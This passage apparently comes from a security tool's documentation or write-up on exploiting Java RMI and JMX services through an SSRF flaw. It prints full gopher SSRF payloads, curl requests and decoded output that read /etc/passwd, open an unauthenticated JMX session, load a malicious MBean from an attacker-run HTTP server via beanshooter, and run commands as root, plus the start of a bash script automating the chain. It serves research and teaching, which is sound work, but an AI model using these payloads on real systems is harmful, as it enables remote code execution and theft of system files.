$ rmg call 127.0.0.1 34985 '"/etc/passwd"' --signature 'byte[] read(String file)' --objid '[-622b5d41:17ddbb22e46:-7fff, 5804173508306632510]' --ssrf-response 4e00093132372e302e302e310000b1e651aced0005770f019dd4a2bf0000017ddbb22e468016757200025b42acf317f8060854e0020000707870000004d4726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f6173680a62696e3a783a313a313a62696e3a2f62696e3a2f7362696e2f6e6f6c6f67696e0a6461656d6f6e3a783a323a323a6461656d6f6e3a2f7362696e3a2f7362696e2f6e6f6c6f67696e0a61646d3a783a333a343a61646d3a2f7661722f61646d3a2f7362696e2f6e6f6c6f67696e0a6c703a783a343a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7362696e2f6e6f6c6f67696e0a73796e633a783a353a303a73796e633a2f7362696e3a2f62696e2f73796e630a73687574646f776e3a783a363a303a73687574646f776e3a2f7362696e3a2f7362696e2f73687574646f776e0a68616c743a783a373a303a68616c743a2f7362696e3a2f7362696e2f68616c740a6d61696c3a783a383a31323a6d61696c3a2f7661722f6d61696c3a2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a31333a6e6577733a2f7573722f6c69622f6e6577733a2f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31343a757563703a2f7661722f73706f6f6c2f757563707075626c69633a2f7362696e2f6e6f6c6f67696e0a6f70657261746f723a783a31313a303a6f70657261746f723a2f726f6f743a2f7362696e2f6e6f6c6f67696e0a6d616e3a783a31333a31353a6d616e3a2f7573722f6d616e3a2f7362696e2f6e6f6c6f67696e0a706f73746d61737465723a783a31343a31323a706f73746d61737465723a2f7661722f6d61696c3a2f7362696e2f6e6f6c6f67696e0a63726f6e3a783a31363a31363a63726f6e3a2f7661722f73706f6f6c2f63726f6e3a2f7362696e2f6e6f6c6f67696e0a6674703a783a32313a32313a3a2f7661722f6c69622f6674703a2f7362696e2f6e6f6c6f67696e0a737368643a783a32323a32323a737368643a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a61743a783a32353a32353a61743a2f7661722f73706f6f6c2f63726f6e2f61746a6f62733a2f7362696e2f6e6f6c6f67696e0a73717569643a783a33313a33313a53717569643a2f7661722f63616368652f73717569643a2f7362696e2f6e6f6c6f67696e0a7866733a783a33333a33333a5820466f6e74205365727665723a2f6574632f5831312f66733a2f7362696e2f6e6f6c6f67696e0a67616d65733a783a33353a33353a67616d65733a2f7573722f67616d65733a2f7362696e2f6e6f6c6f67696e0a63797275733a783a38353a31323a3a2f7573722f63797275733a2f7362696e2f6e6f6c6f67696e0a76706f706d61696c3a783a38393a38393a3a2f7661722f76706f706d61696c3a2f7362696e2f6e6f6c6f67696e0a6e74703a783a3132333a3132333a4e54503a2f7661722f656d7074793a2f7362696e2f6e6f6c6f67696e0a736d6d73703a783a3230393a3230393a736d6d73703a2f7661722f73706f6f6c2f6d71756575653a2f7362696e2f6e6f6c6f67696e0a67756573743a783a3430353a3130303a67756573743a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f3a2f7362696e2f6e6f6c6f67696e0a6375726c5f757365723a783a3130303a3130313a4c696e757820557365722c2c2c3a2f686f6d652f6375726c5f757365723a2f7362696e2f6e6f6c6f67696e0a --plugin GenericPrint.jar | xxd -r -p
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
curl_user:x:100:101:Linux User,,,:/home/curl_user:/sbin/nologin
```


### Attacking JMX via *SSRF*

----

*JMX* is probably one of the most well known *RMI services* and is usually a reliable and easy target for attackers.
Instead of securing *JMX* services correctly with user authentication or client certificates, administrators often
take the easy route and prevent access to *JMX* services from untrusted networks. This makes *SSRF* attacks on *JMX*
endpoints an interesting topic, as it may allows to attack unreachable *JMX* endpoints.

From the *SSRF* perspective, *JMX* is very similar to the custom *RMI service* discussed before. Despite being a well
known service, *JMX* endpoints do not have a fixed ``ObjID`` value. A ``lookup`` operation on the *RMI registry* is
therefore required to interact with the *JMX remote object*. Furthermore, there is one special characteristic
that we have not encountered so far and this is *session management*.

*JMX* supports password protected endpoints and needs therefore to implement *session management*. The *RMI protocol*
has no built in support for *session management*, but it is a common practice to use the ``ObjID`` mechanism for
session management. We already said that custom *remote objects* get assigned a randomly generated ``ObjID`` value during
export and that clients are unable to use the *remote objects* without knowing their ``ObjID``. To make *remote objects*
publicly available, one binds them to an *RMI registry* service, but without doing this, the *remote object* can only be
accessed by clients that somehow obtained the ``ObjID`` value.

When a client wants to connect to a *JMX* service, it first looks up the corresponding bound name within the *RMI registry*.
The *remote object* that is returned by the registry implements the interface ``javax.management.remote.rmi.RMIServer``
and only supports two methods:

```java
public interface RMIServer extends Remote {
    public String getVersion() throws RemoteException;
    public RMIConnection newClient(Object credentials) throws IOException;
}
```

To interact with the *JMX* agent, clients need to obtain a *remote object* that implements the ``RMIConnection`` interface.
Such an object is returned when the client calls the ``newClient`` method and supplies the correct credentials. In this case,
the initial entry point object that implements the ``RMIServer`` interface exports a new *remote object* that implements the
``RMIConnection`` interface. Instead of binding the result to an *RMI registry*, where it could be looked up by everyone, a
reference to the *remote object* is returned to the client that called the ``newClient`` method. The client is then the only
one who obtained the ``ObjID`` value for the new *remote object* and no other clients can interact with it. This demonstrates
how ``ObjID`` values can yield as a *session id* equivalent.

When targeting *JMX* services via *SSRF*, the *session management* adds one additional step during exploitation:

1. Lookup the *JMX* bound name from the *RMI registry*
2. Call the ``newClient`` method to establish a *JMX* session
3. Use the *JMX* session to achieve *RCE*
    * Create the *MLet MBean*
    * Use *MLet* to load a malicious *MBean*
    * Use the malicious *MBean* to achieve *RCE*

Notice that the third step needs to be executed in a short time interval after the second step. When obtaining a reference
to the *remote object* that implements the ``RMIConnection`` interface, a real client would send a corresponding notification
to the *Distributed Garbage Collector* (*DGC*). This informs the *DGC* that the corresponding *remote object* is in use and
should not be cleaned up. Since we obtain the reference via *SSRF*, there is no communication to the *DGC*. Shortly after the
``newClient`` call has generated the new *remote object*, it will be cleaned up by the *DGC*. Therefore, we need to be fast to
communicate to it.


The first thing we need to do is again to obtain the ``ObjID`` and the *TCP port* of the entry point *JMX remote object*.
This is done in the same way as we did for the custom *RMI* service:

```console
$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%2506%256a%256d%2578%2572%256d%2569
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%2506%256a%256d%2578%2572%256d%2569' --silent | xxd -p -c10000
4e00093132372e302e302e31000098a251aced0005770f0132a61f2f0000017de0c0d31680067372002e6a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49536572766572496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f73740000894368ba7b5c1455e10832a61f2f0000017de0c0d31680020178
$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf-response 4e00093132372e302e302e31000098a251aced0005770f0132a61f2f0000017de0c0d31680067372002e6a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49536572766572496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f73740000894368ba7b5c1455e10832a61f2f0000017de0c0d31680020178
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: localhost:35139 ObjID: [32a61f2f:17de0c0d316:-7ffe, 7546479761021067528]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://localhost:8000/rmi-class-definitions.ja
```

Now we know that the *remote object* listens on ``localhost:35139`` with an ``ObjID`` value of ``[32a61f2f:17de0c0d316:-7ffe, 7546479761021067528]``.
This information is sufficient to call the ``newClient`` method on the *remote object*. We expect the *JMX* service to allow unauthenticated connections
and pass ``null`` for the required *credential* argument. Furthermore, we can use the ``GenericPrint`` [\[4\]](#references)
plugin of *remote-method-guesser* to format the return value of the ``newCall`` method in a human readable way:

```console
$ rmg call 127.0.0.1 35139 null --objid '[32a61f2f:17de0c0d316:-7ffe, 7546479761021067528]' --signature 'javax.management.remote.rmi.RMIConnection newClient(Object creds)' --ssrf --encode --gopher
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2568%25ba%257b%255c%2514%2555%25e1%2508%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2502%25ff%25ff%25ff%25ff%25f0%25e0%2574%25ea%25ad%250c%25ae%25a8%2570
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2568%25ba%257b%255c%2514%2555%25e1%2508%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2502%25ff%25ff%25ff%25ff%25f0%25e0%2574%25ea%25ad%250c%25ae%25a8%2570' --silent | xxd -p -c10000
$ rmg call 127.0.0.1 35139 null --objid '[32a61f2f:17de0c0d316:-7ffe, 7546479761021067528]' --signature 'javax.management.remote.rmi.RMIConnection newClient(Object creds)' --plugin GenericPrint.jar --ssrf-response 4e00093132372e302e302e310000da5651aced0005770f0132a61f2f0000017de0c0d3168008737200326a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49436f6e6e656374696f6e496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f7374000089436ff2350a8b9f4f9832a61f2f0000017de0c0d31680070178
[+] Printing RemoteObject:
[+] 	Remote Class:            javax.management.remote.rmi.RMIConnectionImpl_Stub
[+] 	Endpoint:                localhost:35139
[+] 	ObjID:                   [32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]
[+] 	ClientSocketFactory:     default
[+] 	ServerSocketFactory:     default
```

The call was successful and we obtained a reference to a new *remote object*. This new *remote object* implements the ``RMIConnection`` interface
and we can perform *JMX* operations on it. To achieve *remote code execution*, we first need to create the *MLet MBean*:

```console
$ rmg call localhost 35139 '"javax.management.loading.MLet", null, null' --signature 'javax.management.ObjectInstance createMBean(String className, javax.management.ObjectName name, javax.security.auth.Subject delegationSubject)' --objid '[32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]' --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2522%25d7%25fd%254a%2590%256a%25c8%25e6%2574%2500%251d%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%256c%256f%2561%2564%2569%256e%2567%252e%254d%254c%2565%2574%2570%2570
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2522%25d7%25fd%254a%2590%256a%25c8%25e6%2574%2500%251d%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%256c%256f%2561%2564%2569%256e%2567%252e%254d%254c%2565%2574%2570%2570' &>/dev/null
```

Afterwards, we can use the *MLet MBean* to load a malicious *MBean* using the ``getMBeansFromURL`` method. To create the required payload and the *HTTP* listener,
we use *beanshooter* [\[5\]](#references) with it's ``--stager-only`` option:

```console
$ rmg call localhost 35139 'new javax.management.ObjectName("DefaultDomain:type=MLet"), "getMBeansFromURL", new java.rmi.MarshalledObject(new Object[] {"http://172.17.0.1:8000/mlet"}), new String[] { String.class.getName() }, null' --signature 'Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)' --objid '[32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]' --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2513%25e7%25d6%2594%2517%25e5%25da%2520%2573%2572%2500%251b%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%254f%2562%256a%2565%2563%2574%254e%2561%256d%2565%250f%2503%25a7%251b%25eb%256d%2515%25cf%2503%2500%2500%2570%2578%2570%2574%2500%2517%2544%2565%2566%2561%2575%256c%2574%2544%256f%256d%2561%2569%256e%253a%2574%2579%2570%2565%253d%254d%254c%2565%2574%2578%2574%2500%2510%2567%2565%2574%254d%2542%2565%2561%256e%2573%2546%2572%256f%256d%2555%2552%254c%2573%2572%2500%2519%256a%2561%2576%2561%252e%2572%256d%2569%252e%254d%2561%2572%2573%2568%2561%256c%256c%2565%2564%254f%2562%256a%2565%2563%2574%257c%25bd%251e%2597%25ed%2563%25fc%253e%2502%2500%2503%2549%2500%2504%2568%2561%2573%2568%255b%2500%2508%256c%256f%2563%2542%2579%2574%2565%2573%2574%2500%2502%255b%2542%255b%2500%2508%256f%2562%256a%2542%2579%2574%2565%2573%2571%2500%257e%2500%2505%2570%2578%2570%2534%257d%25b9%254a%2570%2575%2572%2500%2502%255b%2542%25ac%25f3%2517%25f8%2506%2508%2554%25e0%2502%2500%2500%2570%2578%2570%2500%2500%2500%254a%25ac%25ed%2500%2505%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%254f%2562%256a%2565%2563%2574%253b%2590%25ce%2558%259f%2510%2573%2529%256c%2502%2500%2500%2578%2570%2500%2500%2500%2501%2574%2500%251b%2568%2574%2574%2570%253a%252f%252f%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%253a%2538%2530%2530%2530%252f%256d%256c%2565%2574%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%253b%25ad%25d2%2556%25e7%25e9%251d%257b%2547%2502%2500%2500%2570%2578%2570%2500%2500%2500%2501%2574%2500%2510%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%2570
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2513%25e7%25d6%2594%2517%25e5%25da%2520%2573%2572%2500%251b%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%254f%2562%256a%2565%2563%2574%254e%2561%256d%2565%250f%2503%25a7%251b%25eb%256d%2515%25cf%2503%2500%2500%2570%2578%2570%2574%2500%2517%2544%2565%2566%2561%2575%256c%2574%2544%256f%256d%2561%2569%256e%253a%2574%2579%2570%2565%253d%254d%254c%2565%2574%2578%2574%2500%2510%2567%2565%2574%254d%2542%2565%2561%256e%2573%2546%2572%256f%256d%2555%2552%254c%2573%2572%2500%2519%256a%2561%2576%2561%252e%2572%256d%2569%252e%254d%2561%2572%2573%2568%2561%256c%256c%2565%2564%254f%2562%256a%2565%2563%2574%257c%25bd%251e%2597%25ed%2563%25fc%253e%2502%2500%2503%2549%2500%2504%2568%2561%2573%2568%255b%2500%2508%256c%256f%2563%2542%2579%2574%2565%2573%2574%2500%2502%255b%2542%255b%2500%2508%256f%2562%256a%2542%2579%2574%2565%2573%2571%2500%257e%2500%2505%2570%2578%2570%2534%257d%25b9%254a%2570%2575%2572%2500%2502%255b%2542%25ac%25f3%2517%25f8%2506%2508%2554%25e0%2502%2500%2500%2570%2578%2570%2500%2500%2500%254a%25ac%25ed%2500%2505%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%254f%2562%256a%2565%2563%2574%253b%2590%25ce%2558%259f%2510%2573%2529%256c%2502%2500%2500%2578%2570%2500%2500%2500%2501%2574%2500%251b%2568%2574%2574%2570%253a%252f%252f%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%253a%2538%2530%2530%2530%252f%256d%256c%2565%2574%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%253b%25ad%25d2%2556%25e7%25e9%251d%257b%2547%2502%2500%2500%2570%2578%2570%2500%2500%2500%2501%2574%2500%2510%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%2570' &>/dev/null
$ beanshooter --stager-only --stager-host 172.17.0.1 --stager-port 8000
[+] Creating HTTP server on: 172.17.0.1:8000
[+] 	Creating MLetHandler for endpoint: /mlet
[+] 	Creating JarHandler for endpoint: /tonka-bean.jar
[+] 	Starting HTTP server... 
[+] 	
[+] Press Enter to stop listening...
[+]
[+] Received request for: /mlet
[+] Sending malicious mlet:
[+] 
[+] 	Class:		de.qtc.tonkabean.TonkaBean
[+] 	Archive:	tonka-bean.jar
[+] 	Object:		MLetTonkaBean:name=TonkaBean,id=1
[+] 	Codebase:	http://172.17.0.1:8000
[+] 	
[+] Received request for: /tonka-bean.jar
[+] Sending malicious jar file... done!
```

The malicious *MBean* that we deployed supports an ``executeCommand`` method that can be used to execute operation system commands.
We can now trigger this method by using the *SSRF* vulnerability:

```console
$ rmg call localhost 35139 'new javax.management.ObjectName("MLetTonkaBean:name=TonkaBean,id=1"), "executeCommand", new java.rmi.MarshalledObject(new Object[] {"id"}), new String[] { String.class.getName() }, null' --signature 'Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)' --objid '[32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]' --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2513%25e7%25d6%2594%2517%25e5%25da%2520%2573%2572%2500%251b%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%254f%2562%256a%2565%2563%2574%254e%2561%256d%2565%250f%2503%25a7%251b%25eb%256d%2515%25cf%2503%2500%2500%2570%2578%2570%2574%2500%2521%254d%254c%2565%2574%2554%256f%256e%256b%2561%2542%2565%2561%256e%253a%256e%2561%256d%2565%253d%2554%256f%256e%256b%2561%2542%2565%2561%256e%252c%2569%2564%253d%2531%2578%2574%2500%250e%2565%2578%2565%2563%2575%2574%2565%2543%256f%256d%256d%2561%256e%2564%2573%2572%2500%2519%256a%2561%2576%2561%252e%2572%256d%2569%252e%254d%2561%2572%2573%2568%2561%256c%256c%2565%2564%254f%2562%256a%2565%2563%2574%257c%25bd%251e%2597%25ed%2563%25fc%253e%2502%2500%2503%2549%2500%2504%2568%2561%2573%2568%255b%2500%2508%256c%256f%2563%2542%2579%2574%2565%2573%2574%2500%2502%255b%2542%255b%2500%2508%256f%2562%256a%2542%2579%2574%2565%2573%2571%2500%257e%2500%2505%2570%2578%2570%25c7%25c0%253e%25a2%2570%2575%2572%2500%2502%255b%2542%25ac%25f3%2517%25f8%2506%2508%2554%25e0%2502%2500%2500%2570%2578%2570%2500%2500%2500%2531%25ac%25ed%2500%2505%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%254f%2562%256a%2565%2563%2574%253b%2590%25ce%2558%259f%2510%2573%2529%256c%2502%2500%2500%2578%2570%2500%2500%2500%2501%2574%2500%2502%2569%2564%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%253b%25ad%25d2%2556%25e7%25e9%251d%257b%2547%2502%2500%2500%2570%2578%2570%2500%2500%2500%2501%2574%2500%2510%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%2570
$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2513%25e7%25d6%2594%2517%25e5%25da%2520%2573%2572%2500%251b%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%254f%2562%256a%2565%2563%2574%254e%2561%256d%2565%250f%2503%25a7%251b%25eb%256d%2515%25cf%2503%2500%2500%2570%2578%2570%2574%2500%2521%254d%254c%2565%2574%2554%256f%256e%256b%2561%2542%2565%2561%256e%253a%256e%2561%256d%2565%253d%2554%256f%256e%256b%2561%2542%2565%2561%256e%252c%2569%2564%253d%2531%2578%2574%2500%250e%2565%2578%2565%2563%2575%2574%2565%2543%256f%256d%256d%2561%256e%2564%2573%2572%2500%2519%256a%2561%2576%2561%252e%2572%256d%2569%252e%254d%2561%2572%2573%2568%2561%256c%256c%2565%2564%254f%2562%256a%2565%2563%2574%257c%25bd%251e%2597%25ed%2563%25fc%253e%2502%2500%2503%2549%2500%2504%2568%2561%2573%2568%255b%2500%2508%256c%256f%2563%2542%2579%2574%2565%2573%2574%2500%2502%255b%2542%255b%2500%2508%256f%2562%256a%2542%2579%2574%2565%2573%2571%2500%257e%2500%2505%2570%2578%2570%25c7%25c0%253e%25a2%2570%2575%2572%2500%2502%255b%2542%25ac%25f3%2517%25f8%2506%2508%2554%25e0%2502%2500%2500%2570%2578%2570%2500%2500%2500%2531%25ac%25ed%2500%2505%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%254f%2562%256a%2565%2563%2574%253b%2590%25ce%2558%259f%2510%2573%2529%256c%2502%2500%2500%2578%2570%2500%2500%2500%2501%2574%2500%2502%2569%2564%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%253b%25ad%25d2%2556%25e7%25e9%251d%257b%2547%2502%2500%2500%2570%2578%2570%2500%2500%2500%2501%2574%2500%2510%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%2570' --silent | xxd -p -c10000
4e00093132372e302e302e310000da6851aced0005770f0132a61f2f0000017de0c0d316800b7400827569643d3028726f6f7429206769643d3028726f6f74292067726f7570733d3028726f6f74292c312862696e292c32286461656d6f6e292c3328737973292c342861646d292c36286469736b292c313028776865656c292c313128666c6f707079292c3230286469616c6f7574292c32362874617065292c323728766964656f290a
$ rmg call localhost 35139 'new javax.management.ObjectName("MLetTonkaBean:name=TonkaBean,id=1"), "executeCommand", new java.rmi.MarshalledObject(new Object[] {"id"}), new String[] { String.class.getName() }, null' --signature 'Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)' --objid '[32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]' --plugin GenericPrint.jar --ssrf-response 4e00093132372e302e302e310000da6851aced0005770f0132a61f2f0000017de0c0d316800b7400827569643d3028726f6f7429206769643d3028726f6f74292067726f7570733d3028726f6f74292c312862696e292c32286461656d6f6e292c3328737973292c342861646d292c36286469736b292c313028776865656c292c313128666c6f707079292c3230286469616c6f7574292c32362874617065292c323728766964656f290a
[+] uid=0(root) gid=0(root) groups=0(root)
```

Executing all these steps in time before the *JMX remote object* gets garbage collected is pretty difficult. The following
simple *bash* script can be used to automate the process:

```bash
#!/bin/bash

SIG_NEW_CLIENT='javax.management.remote.rmi.RMIConnection newClient(Object creds)'
SIG_CREATE_BEAN='javax.management.ObjectInstance createMBean(String className, javax.management.ObjectName name, javax.security.auth.Subject delegationSubject)'
SIG_INVOKE='Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)'

ARG_CREATE_BEAN='"javax.management.loading.MLet", null, null'
ARG_FROM_URL='new javax.management.ObjectName("DefaultDomain:type=MLet"), "getMBeansFromURL", new java.rmi.MarshalledObject(new Object[] {"http://172.17.0.1:8000/mlet"}), new String[] { String.class.getName() }, null'
ARG_EXEC='new javax.management.ObjectName("MLetTonkaBean:name=TonkaBean,id=1"), "executeCommand", new java.rmi.MarshalledObject(new Object[] {"id"}), new String[] { String.class.getName() }, null'

function ssrf() {
    curl "http://172.17.0.2:8000?url=$1" --silent | xxd -p -c10000
}

echo "[+] Performing lookup operation... "
PAYLOAD=$(rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf --gopher --encode --raw)
RESULT=$(ssrf "${PAYLOAD}")

echo "[+]   Parsing lookup result... "
PARSED=$(rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --no-color --ssrf-response "${RESULT}")
JMX_PORT=$(echo "${PARSED}" | head -n 5 | tail -n1 | cut -f3 -d':' | cut -f1 -d' ')
OBJID="[$(echo "${PARSED}" | head -n 5 | tail -n1 | cut -f3 -d'[')"
